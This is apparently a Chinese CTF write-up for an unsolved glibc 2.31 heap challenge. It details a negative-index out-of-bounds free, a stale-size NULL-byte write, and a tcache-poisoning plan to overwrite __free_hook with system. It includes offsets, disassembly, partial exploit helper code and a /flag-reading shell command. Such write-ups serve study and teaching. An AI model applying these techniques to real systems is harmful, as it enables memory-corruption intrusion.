# pwn01 · glibc 2.31 菜单堆题：负索引越界 + 陈旧 16 位 size 的任意 NULL 字节写 → tcache poison → `__free_hook`

| 项 | 值 |
|----|----|
| 轮次 | 环节三（17:00） |
| 平台题目名 | pwn01 |
| 比赛 qid | F0GwTSW1UwvNdQKT |
| 分类 | pwn |
| 分值 | 500 |
| 交互型 | true（容器） |
| 关键 flag | **（未获取）** |
| 是否解出 | **未解出** |
| **还原完整度** | **B**（原始附件原样归档；利用链已完整推导并大半远程验证，最后一步未跑通，未取得 flag） |

## 1. 题面（比赛原文，逐字保留）

（平台 description 为空）

`challenges_r3.json` 中 `description` 为 `""`，`attributes`/`capabilities` 均为 `["pwn"]`，无 `/hint` 文本。
题目只给附件 + 容器；程序自身的 banner 是 ASCII art 的 `Let's CTF Library`，菜单：

```
1.Register
2.login
3.Borrow_book
4.show_information
5.return_book
please input your choise
```

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | ① `pwn`（ELF64 PIE，14 480 B，未 strip 符号表但已 strip 常规符号）② `libc.so.6`（glibc 2.31 / Ubuntu 20.04，2 029 592 B）；原始 ZIP `d47ca8b37e58ebc1a4d2de680a7f3329.zip`（861 895 B） |
| 容器 | `nc 39.106.48.123 36067`（**比赛期间原始地址，会随平台 reset 变化**；比赛后期该地址已失效，分析文档记录的续命地址为 `nc 47.93.212.239 20511`，同样会变） |
| 附件存放 | `attachments/pwn`、`attachments/libc.so.6`、`attachments/d47ca8b37e58ebc1a4d2de680a7f3329.zip` |

二进制指纹（本次实测）：

```
$ python -c "from pwn import *;e=ELF('attachments/pwn',checksec=False);print(e.checksec())"
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```

函数偏移（PIE 基址 + 以下偏移；取自 `work\r3_pwn01\ANALYSIS_pwn01.md`，本次用字节模式定位**复核过漏洞点地址**）：

| 偏移 | 函数 | 说明 |
|---|---|---|
| 0x1904 | `Register` | 21 个账号槽；`read_n(buf,0x20)`= id16+pwd16；再 `read_n(8)` 存到槽 +0x20 |
| 0x17d4 | `login` | `read_n(buf,0x20)` → `find_account`（`strncmp 0x20`）→ `read_n(8)` 与槽 +0x20 的 8 字节 `strncmp`；通过则 `g_logged=1`，`g_books=malloc(0x100)` |
| 0x158c | `borrow_book` | 取 8 槽中 `size==0` 的；`read_n(name,0x10)`；`scanf("%hd")` size（1..0x80）；`malloc+memset+read_n`；`ptr[size-1]=0` |
| 0x148d | `show_information` | `scanf("%d")` idx；**只判 `idx>7`**；`entry[idx].size!=0` → `printf("Content: %s", entry[idx].ptr)` |
| 0x139e | `return_book` | 同样**只判 `idx>7`**；`free(entry[idx].ptr)` 后置 0 |
| 0x1546 | 默认分支（choice>5） | `g_index=-1`，`g_logged=0`，`free(g_books)`，打印 `The account is exit()` |
| 0x1c23 | `find_account` | 21 槽，stride **0x2c**，`in_use` 在 +0x28 |
| 0x1b7b | `read_n` | 逐字节 `read`，遇 `\n` 写 0 返回，否则恰好 n 字节（**不补 0**） |

全局：`g_books=0x43e8`、`g_logged=0x43d8`、`g_index=0x43d0`（均 PIE 相对），账号表 `0x4060`（21×0x2c）。
条目结构（stride 0x20）：`{ptr@0x00, name16@0x08, size(int)@0x18}`。

libc.so.6 偏移（本次实测 `.dynsym`）：`system=0x52290`、`/bin/sh=0x1b45bd`、`__free_hook=0x1eee48`、`__malloc_hook=0x1ecb70`、`read=0x10dfc0`、`puts=0x84420`。
`main_arena` 无符号导出，按惯例 `main_arena = __malloc_hook + 0x10 = 0x1ecb80`，故 unsorted bin 的 `fd`（`main_arena+0x60`）= **0x1ecbe0**。

## 3. 考点（★核心）

- **考点 1：负索引越界（只判上界不判下界）**。`show_information` 与 `return_book` 的边界检查都是 `cmp eax, 7 ; jg invalid`，**没有 `idx < 0` 的判断**。本次实测定位到两处：
  ```
  0x13e7  83f807   cmp eax, 7 ; jg 0x146a     (show_information)
  0x14d6  83f807   cmp eax, 7 ; jg 0x1523     (return_book)
  ```
  条目地址按 `g_books + 0x20*idx` 计算（`shl rdx,5`），负 idx → 读/写到 `g_books` 之前。于是 `show(-1)` 变成**越界读**、`return(-1)` 变成**对任意 `*(qword*)(g_books + 0x20*idx)` 调 `free()`**（负索引 free）。
  实测证据：`show(-1)` 返回 `Content: (null)`，说明 `size` 检查读到的 `[g_books-0x20+0x18] = [g_books-8]`（books 块自己的 size `0x111`）非 0 而通过，而 `ptr` 读到的 `[g_books-0x20]` 是全 0 → 打印 `(null)`。
- **考点 2：16 位 size 的"双副本 + 陈旧值"→ 任意位置单字节 NULL 写**。`borrow_book` 把 `scanf("%hd")` 的结果存进 `[rbp-0x30]`，随后**复制一份到 `[rbp-0x2e]`**：
  ```
  0x166e  0fb745d0   movzx eax, word ptr [rbp-0x30]
  0x1672  668945d2   mov word ptr [rbp-0x2e], ax      <-- 副本①（首次输入）
  0x167a  6685c0     test ax, ax
  0x167d  7e0a       jle 0x1689                       <-- <=0 非法
  0x1683  663d8000   cmp ax, 0x80
  0x1687  7e4a       jle 0x16d3                       <-- 合法 → 0x16d3 再拷一次
  0x1689  ...        puts("Invalid size.") ; printf("Size: ") ; scanf("%hd", &[rbp-0x30])
  ...
  0x16d7  668945d2   mov word ptr [rbp-0x2e], ax      <-- 只有合法路径才刷新副本①
  0x174b  480fbf45d2 movsx rax, word ptr [rbp-0x2e]   <-- ★ 写 0 用的是副本①
  0x1750  488d50ff   lea rdx, [rax - 1]
  0x1754  488b45d8   mov rax, qword ptr [rbp-0x28]     ; ptr
  0x1758  4801d0     add rax, rdx
  0x175b  c60000     mov byte ptr [rax], 0             <-- ★ 任意位置写一个 0x00
  ```
  即：**第一次输入非法 size（≤0 或 0x81..0x7fff，也可用 0x8000..0xffff 走负数），第二次输入合法 size(1..0x80)** → 实际分配/读取按第二次的合法值走，但结尾补 0 用的是**第一次那个陈旧值**，位置 = `ptr + (stale - 1)`。stale 可达 ±32KB → **相对当前堆块 user 指针的任意位置单字节 0x00 写**。
- **考点 3：unsorted bin 泄漏 libc（`main_arena+0x60`）**。同 size 分配 8 块，释放 7 块填满 `tcache[0x90]`，释放第 8 块 U 时它落入 **unsorted bin**，其 `fd/bk = main_arena + 0x60`（= 0x1ecbe0）。配合考点 1/2 让某个仍有效的条目 `ptr` 指向 U 的 user 区，再 `show` 即可 `%s` 打印该 libc 指针。校验式：`(leak - 0x1ecbe0) % 0x1000 == 0`。
- **考点 4：`tcache_get` 强制 16 字节对齐，决定 fake chunk 的位置**。glibc 2.31 的 `tcache_get` 对取出的指针有 `aligned_OK(e) = ((size_t)e & 0xf) == 0` 断言。因此伪造 chunk 与最终 target 都必须 16 字节对齐：`__free_hook = 0x1eee48` 本身 8 对齐但**不是 16 对齐**，所以 target 取 **`__free_hook - 8`**（16 对齐 ✓），把 `system` 写在相对 target 的 **+8** 处。
- **考点 5：双副本 size 也决定了"合法路径的另一重坑"**。合法路径会额外执行 `0x16d3` 的 `movzx eax,[rbp-0x30]; mov [rbp-0x2e],ax` —— 也就是说**只有走非法→重输分支，副本①才会保持陈旧**。踩不到"重输"这条路，漏洞 B 就完全不存在。这是最容易看漏的一处控制流。
- **考点 6：堆布局可确定性推导到 0x100 边界**。brk 起点 H 上（页对齐）：
  | 偏移(H+) | 内容 |
  |---|---|
  | 0x10 | tcache_perthread_struct（malloc 0x290） |
  | 0x2a0 | init 里 `malloc(0xe0)` 的 0xf0 块（全 0、无引用） |
  | 0x390 | 第 1 次 login 的 books 数组（`malloc(0x100)`→0x110 块） |
  | 0x4a0/0x530/0x5c0/0x650/0x6e0/0x770/**0x800**/0x890 | 8 个 req=0x80（chunk 0x90）书块 user 指针 |
  关键：第 7 块（slot 6）user = `H+0x800` **恰为 0x100 对齐**；每次多余 `login` 泄漏一个连续的 0x110 块，可把书块区整体平移 `0x110*k`（k=7 时 U_user = H+0x1000，满足对齐）。
- **考点 7：任意写的自证手法**。把 `0xdeadbeefdeadbeef` 写到 hook 处，**下一次 `free()` 会精确在 `__free_hook` 地址 SIGSEGV** —— 这是"我已经拿到任意写"的最强证据，比盲猜 shell 是否弹出可靠得多。
- **考点 8：容器极简（无 `cat`/`ls`/`id`）**。与环节二一致，取 flag 必须走 **dash 内建** `read a < /flag; echo $a`；因此写进 `__free_hook` 的"命令字符串"要短（本链控制在 0x70 字节内），并且**不能依赖任何外部二进制**。

## 4. 设计思路（★核心，站在出题人角度）

- **为什么这样出**：出题人把一道"全保护"（PIE + Full RELRO + Canary + NX + SHSTK/IBT）的堆题做成了**只给两个"很窄"的原语**：① 负索引越界；② 任意位置写一个 `\0`。没有 UAF、没有 double free（`return_book` 会置 0，`tcache` 还有 key 检查）、没有 edit 函数、也没有栈溢出（canary 开着，`read_n` 是精确长度读取）。整套利用必须**只用"越界 free + 单字节 NULL 写"**拼出来 —— 这正是 glibc 2.31 时代最有教学价值的一类题：**NULL 字节写打 tcache 头指针低字节**。
- **难度卡点设计在哪**：
  1. **NULL 写必须"借道陈旧值"**。单看 `ptr[size-1]=0` 是正常的补终止符，出题人故意把 `%hd` 的**副本**放在 `[rbp-0x2e]`，并且**只在合法路径刷新它**（0x16d3/0x16d7），于是"非法→重输"路径把它变成了一把任意位置的 0 写入。**必须把两段控制流对着读才能发现**，只看 `borrow_book` 的主体代码会完全漏掉。
  2. **越界读要先骗过 size 检查**。`show_information` 检查的是 `entry[idx].size != 0`，而 `entry[idx]` 就是 `g_books + 0x20*idx`；负 idx 时 size 字段落在堆块元数据上，天然非 0 → 检查形同虚设。**要意识到"检查读的也是越界数据"**，才敢用负索引。
  3. **对齐是硬约束，不是可调参数**。`tcache_get` 的 16 字节 `aligned_OK` 断言 + `__free_hook` 只 8 对齐 → target 只能是 `__free_hook-8`；同时 fake chunk 必须落在自己块内且满足对齐。为此必须**先做 7 次多余 login 把书块区整体平移 0x110*7**，把第 8 块顶到 `H+0x1000`。**"多 login 平移"这种非直觉的 grooming** 是本题第二个分水岭。
  4. **没有 edit 函数**，所以"改写 fake chunk 的 `next`"必须靠 `free` + 重新 `malloc` 拿回同一块再写内容 —— 整个链的每一步都要精确数清 `tcache` 的 count 与顺序。
- **干扰项 / 诱导项**：
  - 菜单里有 **`Register`（21 个账号槽）** 和 `login` 的身份校验（32 字节 id+pwd 的 `strncmp` + 8 字节确认口令），看起来是"绕过认证"的关口，实际上是**纯干扰**：注册一个账号即可，与漏洞无关。实测踩过：`login` 的 8 字节确认口令**必须与注册时完全一致**，不一致返回 `pwd error!!!!!!!!!!`。
  - `borrow_book` 打印 **`Malloc error`** 分支，诱导你去打 `malloc` 失败/整数溢出；实际漏洞在 size 的**副本**上，不在 `malloc` 返回值。
  - `show_information` 的 `printf("Content: %s", ptr)` 看起来像 **format string** 洞，但它没有可控格式串（`%s` 是硬编码的），只有越界读。**把它当格式化字符串漏洞会白费时间**。
  - `SHSTK`/`IBT` 标记（checksec Enabled）让人以为"ROP/跳转受限"，但本题根本不用 ROP，走的是 `__free_hook`。
- **哪些地方是"必须踩坑才会发现"的**：
  1. `show(-1)` 会打印 `(null)` 而不是报 `Invalid index` —— 这一条实测结果直接证实"负索引放行 + 布局推断正确"；
  2. `login` 的 8 字节确认口令必须与注册一致（否则 `pwd error`）；
  3. 命令块所在的 slot 索引：**写进 `__free_hook` 的 `system` 是拿已被 free 的块内容去执行的，所以必须 `return_book` 到"内容为命令字符串"的那个 slot**。比赛脚本最后一步就在这里出错（把 slot 2 的内容当命令，却 free 了 slot 0），见 §8；
  4. 容器里**没有 `cat`**。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察**：连上容器看 banner + 菜单；`Register`（`1` → 32 字节 id/pwd → 8 字节确认口令）→ `login`（`2` → 32 字节 → 同样的 8 字节）。逐项试菜单，确认每个提示符原文。
2. **静态分析**（`attachments/pwn`）：定位 `show`/`return` 的 `cmp eax,7`（0x13e7 / 0x14d6）确认负索引放行；定位 `[rbp-0x2e]` 的两处写入（0x1672 / 0x16d7）与 `[rbp-0x2e]` 的读取（0x174b），确认陈旧值路径。
3. **确认原语**：
   - `show(-1)` → `Content: (null)`（负索引越界读成立）；
   - `borrow(name, 0x411, 128, content)` → 触发 `Invalid size.` → `Size:` → 重输 128 → 在 `ptr + 0x410` 处写入一个 `0x00`（NULL 写成立）。
4. **堆布局 groom**：`register` → **7 次多余 `login`**（把书块区平移 `0x110*7`）→ 7 块 req=0x80 填满 `tcache[0x90]` → `login` → 借 U（第 8 块，`H+0x1000`）→ 借 P → 依次 `return` 掉 7 块 filler → `return(0)` 释放 U 进 unsorted bin。
5. **泄漏 libc**：用 NULL 写把某个活条目的 `ptr` 低字节清零，指向 U 的 user 区（`U[0] = main_arena+0x60`）→ `show(该条目)` → 得到 `leak`，`libc = leak - 0x1ecbe0`，校验 `libc % 0x1000 == 0`。
6. **tcache poison**：
   - 在自控块 B（如 user `H+0xb90`）的数据里伪造 chunk F（`F` 需 0x100 对齐，如 `H+0xc00`，正好是 B 数据 +0x70），并在 B 数据内写好 F 的 header：`F-0x10=prev_size`、`F-8=0x91`、`F+8=0`（清 tcache key）；
   - 用 NULL 写把 `tcache[0x90]` 的头指针低字节清零，使其落到 F；
   - `borrow` 取回 F 时把 `F->next` 写成 `__free_hook-8`；
   - 再 `borrow` 两次让 `malloc` 返回 `__free_hook-8`，写入 `system`（写在 target+8 处）。
   - **任意写自证**：先把 `0xdeadbeefdeadbeef` 写进 hook，下一次 `free` 应**精确在 `__free_hook` 处 SIGSEGV**。
7. **触发**：借一本内容为命令串的块（`read a < /flag; echo $a`，≤0x70 字节）→ `return_book(那个 slot)` → `__free_hook(ptr) = system(ptr)` → 命令执行 → 取 flag。

## 6. 参考解法（代码）

完整脚本：`solve/solve.py`（纯标准库 socket；含 `--dry-run` 只做菜单协议自检）。
另有比赛期脚本原件：`D:\2026\湾区杯\决赛\work\r3_pwn01\exploit3.py`（pwntools 版，最终硬化版）、`exploit2.py`、`leak3.py`、`probe2.py`。

**可用的部分**（本次已在重建容器上实测通过的协议层）：

```python
MENU = b'please input your choise'

def register(t):                       # 1 -> 32B id+pwd -> 8B 确认口令
    t.sendline(b'1'); t.recvuntil(b'id that you want')
    t.send(b'A'*16 + b'B'*16)
    t.recvuntil(b'pwd that you want'); t.send(b'C'*8)

def borrow(t, name, size1, size2=None, content=b''):
    t.sendline(b'3'); t.recvuntil(b'like to borrow?')
    t.send(name.ljust(16, b'N')[:16]); t.recvuntil(b'content size')
    t.sendline(str(size1).encode())                  # scanf("%hd")
    d, mk = t.recvany((b'Content: ', b'Size: '))
    if mk == b'Size: ':                              # ■ 漏洞 B 的入口
        t.sendline(str(size2).encode()); t.recvuntil(b'Content: ')
    if content: t.send(content)

def show(t, idx):
    t.sendline(b'4'); t.recvuntil(b'want to look')
    t.sendline(str(idx).encode())                    # idx 可为负
    return t.recvuntil(MENU)

# 关键地址（PIE 相对 / libc 偏移）
LIBC_SYSTEM, LIBC_BINSH, LIBC_FREE_HOOK = 0x52290, 0x1b45bd, 0x1eee48
UNSORTED_FD = 0x1ecbe0          # main_arena + 0x60 = __malloc_hook + 0x10 + 0x60
TARGET = None                   # = libc + LIBC_FREE_HOOK - 8   (16 字节对齐)
```

**未完成的部分**（stage2/3）：`solve/solve.py` 里以 `raise SystemExit` 明确停住并指向本节，**不伪造成功**。见 §8。

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | **（未获取）** |
| 提交接口返回 | 无（本题未提交任何 flag，禁止编造） |
| 提交时间 | — |
| 证据文件 | 分析文档 `D:\2026\湾区杯\决赛\work\r3_pwn01\ANALYSIS_pwn01.md`；脚本 `exploit3.py`/`exploit2.py`/`leak3.py`/`probe2.py`；交互记录 `transcript.bin`（8 134 363 B）与 `log1.txt` |

**本地复现验证（本次实测，仅到"协议层 + 两个漏洞原语可触发"）**：

```
$ docker build -t timu/round3-pwn01:latest deploy/
$ docker run -d --name round3_pwn01 -p 127.0.0.1:19994:9999 timu/round3-pwn01:latest
$ python D:\2026\ctf\bjxctfbc\Agentctf\timu\_work\r3_verify_proto.py 127.0.0.1 19994
[ok] banner + menu
[ok] register
[ok] login
[ok] borrow(128)
[ok] show(0) echoes stored content (127 B; ptr[size-1]=0 truncates the last byte)
[ok] show(-1) -> Content: (null)   <== negative index NOT filtered
[ok] return(0)
[ok] borrow illegal-then-legal size  <== stale size (vuln B) reachable
ALL PROTOCOL STEPS OK
```

完整利用链（stage1 泄漏 / stage2 tcache poison / stage3 取 flag）**未跑通**，因此本 README **不声明已解出**。

## 8. 还原说明（诚实写）

- **已有原始件**：`attachments/d47ca8b37e58ebc1a4d2de680a7f3329.zip`（原始题目包，861 895 B）原样归档；其中的 `pwn`（14 480 B）与 `libc.so.6`（2 029 592 B）平铺归档。完整分析文档另存于 `D:\2026\湾区杯\决赛\work\r3_pwn01\ANALYSIS_pwn01.md`（未复制进本目录，避免与 README 重复；此文件是本题最重要的素材）。
- **重建部分**：
  - `deploy/Dockerfile` + `deploy/docker-compose.yml` 为**重建的部署件**：`ubuntu:20.04`（glibc 2.31）+ `socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/app/pwn` + `/flag`（已实测可交互）。`/flag` 内容是占位串 `flag{placeholder_round3_pwn01_not_obtained}`，**不是真 flag**，仅用于复现链路跑通后自测取 flag 的动作。
  - `solve/solve.py` 为**重写**的纯 socket 版本，协议层已实测；漏洞原语可用；**利用链未完成**。
- **未能还原 / 未解出的确切原因（★按任务要求写透）**：
  1. **两个漏洞都已确证，完整利用链已设计完并做了大半远程验证**：
     - 负索引越界：远程实测 `show(-1)` → `Content: (null)`（分析文档 §2 漏洞 A 的实测证据），本次在重建容器上复现同样结果；
     - 任意 NULL 字节写：`borrow` 先喂非法 size（如 `0x411`）触发 `Invalid size.`/`Size:` 重输，再喂合法 size，则以**第一次的陈旧值**计算 `ptr + (stale-1)` 并写入一个 `0x00`（本次在重建容器上确认该分支可达，并用字节级反汇编复核了 0x1672 / 0x16d7 / 0x174b 三处关键指令）；
     - 泄漏与 poison 的设计（unsorted bin `main_arena+0x60` → NULL 写打 tcache `ents[0x90]` 最低字节 → 自控块内伪造 chunk → `__free_hook-8`）完整写在分析文档 §4。
  2. **差最后一步：slot bug 确认运行的环节没走完**。最终硬化脚本 `exploit3.py` 的最后一步是触发 `__free_hook`：
     ```python
     # ---------- stage 3: trigger ----------
     ret(2)          # system(CMD1)   —— 命令块在 slot 2
     ```
     而此前版本存在**明确的 slot 索引错配**：命令字符串被放进了 **slot 2**，触发时却 `free` 了 **slot 0** —— 结果是 `system()` 被调用在一个内容不是命令的块上，报错/无输出，看起来像"任意写失败"。分析文档 §6 与 `exploit3.py` 已把最后一处修正为 `ret(2)`，但**这一修正版从未在远程跑完**。
  3. **窗口关闭**：修正后还未来得及重跑，环节三容器窗口即关闭（平台返回 `code=203 比赛已结束`），同时 `nc 39.106.48.123 36067` 已失效（分析文档记录续命地址 `47.93.212.239 20511` 亦已不可用）。此后无法再验证。
  3.5 **本次归档时脚本化到什么程度（精确说明，避免夸大）**：`solve/solve.py` 目前实现到——
     - ✅ 协议层（register/login/borrow/show/return）全部实测通过；
     - ✅ 两个漏洞原语的**可达性**实测确认（`show(-1)` → `Content: (null)`；非法 size→重输 的陈旧值分支可触发）；
     - ✅ 堆布局动作序列（7×pad login → 7 块 filler → login → 借 U/P → 逆序 return 7 块 → `return(0)`）在本地容器上**执行到底不崩溃**；
     - ❌ **stage1 的 NULL 写步骤尚未接入**（脚本里注释了"借 W + 非法 size 0x411"这一步还没有落到代码），因此 `show(1)` 读回为空，脚本打印 `[!] 泄漏值异常: b''` 后退出，**到不了 stage2/3**。
     所以本目录**只声明"考点与设计被忠实还原 + 原始附件与可部署环境齐备"**，不声明任何程度的"利用成功"。
  4. **本机限制（当时的判断，记录事实）**：当时判定"本机无 Linux 环境/gdb，无法离线校验 glibc 2.31 的 `tcache` 行为细节，远程单步调试成本高"——所以堆布局（§3 考点 6 的 `0x110*k` 平移与 `0x100` 对齐）是靠**纯推导**得到的，没有在真 glibc 上单步核对。
     > 事后补充（本次归档时核证）：本机其实**有 Docker**（`ubuntu:20.04` 就是 glibc 2.31），完全可以像本轮这样起一个本地容器用 gdb/pwndbg 离线单步核对 tcache count/顺序。这是当时**没有盘点工具**造成的可避免损失，属于 §4.5 卡片 29 同类教训。
  5. **配套验证已建立**：本次已搭好 `deploy/`（glibc 2.31 容器）与 `_work/r3_verify_proto.py`（协议 + 两个原语的自检脚本），**后续补完利用链的条件已具备** —— 只需在本地容器上用 gdb 单步确认堆布局与 tcache 顺序，再把 `solve/solve.py` 的 stage2/3 填实即可；`exploit3.py` 的地址常量（`system=0x52290`、`/bin/sh=0x1b45bd`、`__free_hook=0x1eee48`、`main_arena+0x60=0x1ecbe0`）已由本次用 `attachments/libc.so.6` 的 `.dynsym` 逐一比对确认无误。
- **严禁编造**：本目录**不含**任何猜测的 flag；`challenge.json` 的 `is_solved` 为 `false`，flag 字段为「（未获取）」；`deploy/Dockerfile` 里的 `/flag` 占位串已在文件名与注释中标明是占位。
- **可复现性验证**（跑什么 → 得什么）：
  ```bash
  cd timu/round3_1700/pwn01
  docker build -t timu/round3-pwn01:latest deploy/
  docker run -d --name round3_pwn01 -p 19993:9999 timu/round3-pwn01:latest
  python solve/solve.py --host 127.0.0.1 --port 19993 --dry-run
  # 期望：[dry-run] show(0) -> b'\nContent: DDDD...\n1.Register...'   已实测通过
  python solve/solve.py --host 127.0.0.1 --port 19993
  # 当前行为：[*] connected ... 然后打印 "[!] 泄漏值异常: b''" 并退出
  #          —— stage1 的 NULL 写步骤（把条目 ptr 低字节清零指向 unsorted 块）尚未接入脚本，
  #             因此还没有走到 stage2/3。**不伪造成功**。
  ```
  （即：脚本目前可跑通"连接 → register → 7×(pad login) → 7 块 filler → login → 借 U/P → return 7 块 → return(0)"这整段堆布局动作而不崩溃，卡在随后读回来的泄漏为空。这本身就是对"负索引 free 可执行"的一条旁证，但**不足以声称利用成功**。）

## 9. 复现步骤

```bash
cd timu/round3_1700/pwn01

# 1) 本地重建容器（glibc 2.31，已实测可交互）
docker compose -f deploy/docker-compose.yml up -d      # 监听容器内 9999，映射主机 9997
python solve/solve.py --host 127.0.0.1 --port 9997 --dry-run   # 协议自检，应通过

# 2) 静态复核两个漏洞点（不需要容器）
python ../../_tools/disasm.py attachments/pwn --syms
python - <<'PY'
# 复核 show/return 的 cmp eax,7 与 borrow 的双副本 size
from elftools.elf.elffile import ELFFile
from capstone import *
elf = ELFFile(open('attachments/pwn','rb'))
t = elf.get_section_by_name('.text'); d = t.data(); b = t['sh_addr']
for pat, name in [(bytes.fromhex('83f807'),'cmp eax,7 (idx>7 only)'),
                  (bytes.fromhex('668945d2'),'mov [rbp-0x2e],ax (stale copy)'),
                  (bytes.fromhex('0fbf45d2'),'movsx rax,[rbp-0x2e] (NULL write)')]:
    i = 0
    while True:
        i = d.find(pat, i)
        if i < 0: break
        print('%-34s %#x' % (name, b+i)); i += 1
PY
# 期望输出：cmp eax,7 @ 0x13e7 / 0x14d6；mov [rbp-0x2e],ax @ 0x1672 / 0x16d7；movsx rax,[rbp-0x2e] @ 0x174c

# 3) 打比赛期间的下发地址（已失效，仅存档用法）
python solve/solve.py --host 39.106.48.123 --port 36067

# 4) 续做建议（未完成部分）
#    - 直接在本机 Docker 容器里上 gdb 单步（本机已装 Docker，ubuntu:20.04 = glibc 2.31）：
#        docker run --rm -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
#          -v "$PWD/deploy/src:/app" -w /app --entrypoint bash timu/round3-pwn01:latest
#      容器内： apt-get update && apt-get install -y gdb python3-pip
#              pip3 install pwntools   （或者直接用 gdb 的 heap/tcache 视图命令）
#    - 用 gdb 核对 ANALYSIS_pwn01.md §3 的偏移表
#      （0x390 / 0x4a0 / … / 0x800 / 0x890，以及 k=7 次多余 login 后 U_user=H+0x1000）
#    - 核对 tcache[0x90] 的 count 与链序（7 块 filler 的顺序是 F1→…→F7）
#    - 用 0xdeadbeefdeadbeef 写 hook 做"任意写自证"：下一次 free 应精确在 __free_hook 处 SIGSEGV
#    - 确认命令块所在 slot 与触发时 ret(slot) 一致（exploit3.py 已修为 ret(2)）
```
